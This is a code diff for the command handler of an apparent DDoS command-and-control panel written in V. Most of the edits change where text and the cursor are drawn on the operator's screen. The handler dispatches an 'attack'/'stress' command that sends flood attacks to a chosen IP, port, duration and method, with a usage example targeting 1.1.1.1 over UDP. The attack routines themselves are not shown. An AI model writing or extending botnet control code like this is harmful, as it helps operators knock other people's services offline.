@@ -42,14 +42,18 @@ pub fn cmd_handler(mut socket net.TcpConn, mut svr server.Server, mut c Current)
 		config_f := os.read_file(os.getwd() + "/assets/config.skrillec") or { "" }
 		// Output CNC Information
 		mut _, output_p := utils.parse(config_f, "CNC_Output", "cnc_output_position")
-		output_row := output_p.split(",")[0]
-		output_column := output_p.split(",")[1]
+		output_row := output_p.split(",")[0].int()
+		output_column := output_p.split(",")[1].int()
 		/*================================================================================*/
-
-		// Outhost Hostname Information
+		// Output Hostname Information
 		mut _, hostname_p := utils.parse(config_f, "Hostname", "hostname_position")
-		hostname_r := output_p.split(",")[0]
-		hostname_c := output_p.split(",")[1]
+		hostname_r := hostname_p.split(",")[0].int()
+		hostname_c := hostname_p.split(",")[1].int()
+		/*================================================================================*/
+		// Cursor Position Information
+		mut _, cursor_p := utils.parse(config_f, "Hostname", "cli_cursor")
+		curosr_r := cursor_p.split(",")[0].int()
+		cursor_c := cursor_p.split(",")[1].int()
 		/*================================================================================*/
 
 		// Command Handling
@@ -77,19 +81,19 @@ pub fn cmd_handler(mut socket net.TcpConn, mut svr server.Server, mut c Current)
 				"attack", "stress" {
              		if c.cmd_args.len > 3 {
 						 attack_system.attack(c.cmd_args[1], c.cmd_args[2], c.cmd_args[3], c.cmd_args[4])
-						 utils.place_text(mut socket, output_row.int(), output_column.int(), "Attack has been sent to: ${c.cmd_args[1]}:${c.cmd_args[2]} for ${c.cmd_args[3]}\r\n")
+						 utils.place_text(mut socket, output_row, output_column, "Attack has been sent to: ${c.cmd_args[1]}:${c.cmd_args[2]} for ${c.cmd_args[3]}\r\n")
 					} else {
-						utils.place_text(mut socket, output_row.int(), output_column.int(), "[x] Error, Invalid argument\r\nUsage: attack <ip> <port> <time> <method>\r\nExample: attack 1.1.1.1 80 30 UDP\r\n")
+						utils.place_text(mut socket, output_row, output_column, "[x] Error, Invalid argument\r\nUsage: attack <ip> <port> <time> <method>\r\nExample: attack 1.1.1.1 80 30 UDP\r\n")
 					}
 				} else {
 					time.sleep(1*time.second)
-					utils.place_text(mut socket, output_row.int(), output_column.int(), "Command not found!\r\n")
-					utils.place_text(mut socket, hostname_r.int(), hostname_c.int(), "")
+					utils.place_text(mut socket, output_row, output_column, "Command not found!\r\n")
 				}
 			}
+			// utils.place_text(mut socket, curosr_r, cursor_c, "")
 			println(data)
 			time.sleep(1*time.second)
-			utils.place_text(mut socket, 21, 50, "")
+			utils.place_text(mut socket, curosr_r, cursor_c, "")
 		}
 	}
 }
